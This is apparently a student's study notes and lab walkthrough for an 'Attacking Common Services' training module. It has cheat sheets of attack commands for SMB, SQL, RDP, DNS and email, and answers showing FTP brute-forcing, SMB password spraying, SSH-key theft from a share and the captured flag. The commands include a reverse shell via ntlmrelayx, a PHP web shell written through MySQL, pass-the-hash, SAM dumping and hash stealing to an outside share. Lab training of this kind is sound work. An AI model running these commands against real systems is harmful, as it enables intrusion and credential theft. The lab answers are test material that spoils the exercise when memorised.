![](https://i.imgur.com/odyOpaO.png)

# Attacking Common Services

This section will focus on internal services, but this may apply to cloud storage synced locally to servers and workstations.
## Server Message Block (SMB)

SMB is commonly used in Windows networks, and we will often find share folders in a Windows network. We can interact with SMB using the GUI, CLI, or tools. Let us cover some common ways of interacting with SMB using Windows & Linux.

## Windows

To open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
The command [net use](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)) connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter `n`.
```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance

The command completed successfully.
```

With the shared folder mapped as the `n` drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
```cmd-session
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302
```

| Syntax | Description                                                    |
| ------ | -------------------------------------------------------------- |
| `dir`  | Application                                                    |
| `n:`   | Directory or drive to search                                   |
| `/a-d` | `/a` is the attribute and `-d` means not directories           |
| `/s`   | Displays files in a specified directory and all subdirectories |
| `/b`   | Uses bare format (no heading information or summary)           |
The following command `| find /c ":\\"` process the output of `dir n: /a-d /s /b` to count how many files exist in the directory and subdirectories. You can use `dir /?` to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With `dir` we can search for specific names in files such as:

- cred
- password
- users
- secrets
- key
- Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.
```cmd-session
C:\htb>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt


C:\htb>dir n:\*secret* /s /b

n:\Contracts\private\secret.txt
```

If we want to search for a specific word within a text file, we can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).
```cmd-session
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called `cmdlets`. Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets

#### Linux

Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.

```shell-session
r3so1v3@htb[/htb]$ sudo mkdir /mnt/Finance
r3so1v3@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

Alternatively we can use a credentials file
```shell-session
r3so1v3@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

#### Linux - Find
```shell-session
r3so1v3@htb[/htb]$ find /mnt/Finance/ -name *cred*

/mnt/Finance/Contracts/private/credentials.txt
```

Next, let's find files that contain the string `cred`:
```shell-session
r3so1v3@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred

/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
```

#### Tools to Interact with Common Services

  

| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com/)           | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |

### The Concept of Attacks
![](https://i.imgur.com/Xx3MCDa.png)

First, we have a `Source` that performs the specific request to a `Process` where the vulnerability gets triggered. Each process has a specific set of `Privileges` with which it is executed. Each process has a task with a specific goal or `Destination` to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.

Sensitive information may include, but is not limited to:

- Usernames.
- Email Addresses.
- Passwords.
- DNS records.
- IP Addresses.
- Source code.
- Configuration files.
- PII.
## FTP
## SMB

Anonymous Authentication

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including smbclient, smbmap, rpcclient, or enum4linux. Let's explore how we can interact with file shares and RPC using null authentication.


## Commands
|**Command**|**Description**|
|---|---|
|`ftp 192.168.2.142`|Connecting to the FTP server using the `ftp` client.|
|`nc -v 192.168.2.142 21`|Connecting to the FTP server using `netcat`.|
|`hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142`|Brute-forcing the FTP service.|

## Attacking SMB

|**Command**|**Description**|
|---|---|
|`smbclient -N -L //10.129.14.128`|Null-session testing against the SMB service.|
|`smbmap -H 10.129.14.128`|Network share enumeration using `smbmap`.|
|`smbmap -H 10.129.14.128 -r notes`|Recursive network share enumeration using `smbmap`.|
|`smbmap -H 10.129.14.128 --download "notes\note.txt"`|Download a specific file from the shared folder.|
|`smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`|Upload a specific file to the shared folder.|
|`rpcclient -U'%' 10.10.110.17`|Null-session with the `rpcclient`.|
|`./enum4linux-ng.py 10.10.11.45 -A -C`|Automated enumeratition of the SMB service using `enum4linux-ng`.|
|`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`|Password spraying against different users from a list.|
|`impacket-psexec administrator:'Password123!'@10.10.110.17`|Connect to the SMB service using the `impacket-psexec`.|
|`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`|Execute a command over the SMB service using `crackmapexec`.|
|`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`|Enumerating Logged-on users.|
|`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`|Extract hashes from the SAM database.|
|`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`|Use the Pass-The-Hash technique to authenticate on the target host.|
|`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`|Dump the SAM database using `impacket-ntlmrelayx`.|
|`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`|Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`.|

## Attacking SQL Databases

|**Command**|**Description**|
|---|---|
|`mysql -u julio -pPassword123 -h 10.129.20.13`|Connecting to the MySQL server.|
|`sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`|Connecting to the MSSQL server.|
|`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux.|
|`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.|
|`mysql> SHOW DATABASES;`|Show all available databases in MySQL.|
|`mysql> USE htbusers;`|Select a specific database in MySQL.|
|`mysql> SHOW TABLES;`|Show all available tables in the selected database in MySQL.|
|`mysql> SELECT * FROM users;`|Select all available entries from the "users" table in MySQL.|
|`sqlcmd> SELECT name FROM master.dbo.sysdatabases`|Show all available databases in MSSQL.|
|`sqlcmd> USE htbusers`|Select a specific database in MSSQL.|
|`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`|Show all available tables in the selected database in MSSQL.|
|`sqlcmd> SELECT * FROM users`|Select all available entries from the "users" table in MSSQL.|
|`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`|To allow advanced options to be changed.|
|`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`|To enable the xp_cmdshell.|
|`sqlcmd> RECONFIGURE`|To be used after each sp_configure command to apply the changes.|
|`sqlcmd> xp_cmdshell 'whoami'`|Execute a system command from MSSQL server.|
|`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`|Create a file using MySQL.|
|`mysql> show variables like "secure_file_priv";`|Check if the the secure file privileges are empty to read locally stored files on the system.|
|`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`|Read local files in MSSQL.|
|`mysql> select LOAD_FILE("/etc/passwd");`|Read local files in MySQL.|
|`sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`|Hash stealing using the `xp_dirtree` command in MSSQL.|
|`sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`|Hash stealing using the `xp_subdirs` command in MSSQL.|
|`sqlcmd> SELECT srvname, isremote FROM sysservers`|Identify linked servers in MSSQL.|
|`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`|Identify the user and its privileges used for the remote connection in MSSQL.|

## Attacking RDP

|**Command**|**Description**|
|---|---|
|`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`|Password spraying against the RDP service.|
|`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`|Brute-forcing the RDP service.|
|`rdesktop -u admin -p password123 192.168.2.143`|Connect to the RDP service using `rdesktop` in Linux.|
|`tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`|Impersonate a user without its password.|
|`net start sessionhijack`|Execute the RDP session hijack.|
|`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`|Enable "Restricted Admin Mode" on the target Windows host.|
|`xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`|Use the Pass-The-Hash technique to login on the target host without a password.|

## Attacking DNS

|**Command**|**Description**|
|---|---|
|`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`|Perform an AXFR zone transfer attempt against a specific name server.|
|`subfinder -d inlanefreight.com -v`|Brute-forcing subdomains.|
|`host support.inlanefreight.com`|DNS lookup for the specified subdomain.|

## Attacking Email Services

|**Command**|**Description**|
|---|---|
|`host -t MX microsoft.com`|DNS lookup for mail servers for the specified domain.|
|`dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`|DNS lookup for mail servers for the specified domain.|
|`host -t A mail1.inlanefreight.htb.`|DNS lookup of the IPv4 address for the specified subdomain.|
|`telnet 10.10.110.20 25`|Connect to the SMTP server.|
|`smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`|SMTP user enumeration using the RCPT command against the specified host.|
|`python3 o365spray.py --validate --domain msplaintext.xyz`|Verify the usage of Office365 for the specified domain.|
|`python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`|Enumerate existing users using Office365 on the specified domain.|
|`python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`|Password spraying against a list of users that use Office365 for the specified domain.|
|`hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`|Brute-forcing the POP3 service.|
|`swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213`|Testing the SMTP service for the open-relay vulnerability.|

# Questions & Answers

### Attacking FTP
1.  What port is the FTP service running on?
Do nmap scan and see that it is 2121

2.  What username is available for the FTP server?
First things first we need to try logging in as anonymous:
```
ftp -P 2121 anonymous@10.129.203.6
Connected to 10.129.203.6.
ls
220 ProFTPD Server (InlaneFTP) [10.129.203.6]
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22514|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list

```

Then download both lists using get users.list and get passwords.list
Then open the users.list and try putting all the usernames to the htb-academy answer box until it gives correct

3. Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. 
Then we can try bruteforcing with hydra for password, not medusa, cuz it takes longer:
```
hydra -l robin -P /home/r3so1ve/hack/htb-academy/attacking-common-services/passwords.list ftp://10.129.203.6:2121 -t 10

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-25 22:24:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 250 login tries (l:1/p:250), ~25 tries per task
[DATA] attacking ftp://10.129.203.6:2121/
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 150 to do in 00:02h, 10 active
[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
1 of 1 target successfully completed, 1 valid password found

```
As we now the creds now:
```
username: robin
password: 7iz4rnckjsduza7
```
We ssh to target and get the flag:
```
ssh robin@10.129.203.6
```

### Attacking SMB
4. What is the name of the shared folder with READ permissions? 
So we need to use smbmap for this, as this tool will give us info about permissions, not smbclient
```
smbmap -H 10.129.203.6
[+] IP: 10.129.203.6:445	Name: 10.129.203.6                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
```

5. What is the password for the username "jason"? 
So first of all we need to find the username jason, for this we use:
```
enum4linux-ng 10.129.203.6 -A

=====================================
|    Users via RPC on 10.129.203.6    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 user(s) via 'enumdomusers'
[+] After merging user results we have 2 user(s) total:
'1000':
  username: jason
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: robin
  name: ''
  acb: '0x00000010'
  description: ''

```
The output of the above command is much longer, but I included only the piece with username
Then we can use crackmapexec to bruteforce password for jason:
```
crackmapexec smb 10.129.203.6 -u 'jason' -p pws.list --local-auth
SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
.
.
.
SNIP
.
.
.
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:warrior STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
```

6. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer. 
As we now the username and password, so we can try to ssh as jason to target, but when we try it, we get:
```
ssh jason@10.129.203.6             
jason@10.129.203.6: Permission denied (publickey).
```
This means that we need to get `id_rsa` which located in the GGJ share, but at first we need to mount to share. Mounting a shared folder from a remote server (like an SMB share) allows you to access its contents as if they were part of your local filesystem. In this case, the reason to mount the SMB share is to access the `id_rsa` file (which is the SSH private key for the user) from the `GGJ` share on the remote server.

First create the folder for mounting:
```
sudo mkdir -p /mnt/smb_htb
```

So we mount and then copy it (`id_rsa`)to your comfy location:
```
sudo mount -t cifs //10.129.203.6/GGJ /mnt/smb_htb -o username=jason,password='34c8zuNBo91!@28Bszh',ro 
cp /mnt/smb_htb/id_rsa /home/r3so1ve/hack/htb-academy/attacking-common-services/
```

Making sure we got it:
```
ls
total 24K
-rwxr-xr-x 1 r3so1ve r3so1ve 3.4K Sep 26 11:59 id_rsa
-rw-r--r-- 1 r3so1ve r3so1ve 2.0K Sep 25 22:17 passwords.list
-rw-rw-r-- 1 r3so1ve r3so1ve 2.5K May  9  2022 pws.list
-rw-r--r-- 1 r3so1ve r3so1ve 1.6K Aug 23 15:09 pws.zip
-rw-rw-r-- 1 r3so1ve r3so1ve   72 Sep 25 22:17 users.list
-rw-r--r-- 1 r3so1ve r3so1ve  434 Aug 23 15:09 users.zip

```

Don't forget to change permissions:
```
chmod 600 id_rsa 
```

And finally ssh to target:
```
ssh jason@10.129.203.6 -i id_rsa 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 26 Sep 2024 06:59:23 AM UTC

  System load:  0.04               Processes:               232
  Usage of /:   25.4% of 13.72GB   Users logged in:         0
  Memory usage: 14%                IPv4 address for ens160: 10.129.203.6
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
$ ls
flag.txt
$ cat flag.txt
HTB{SMB_4TT4CKS_2349872359}

```
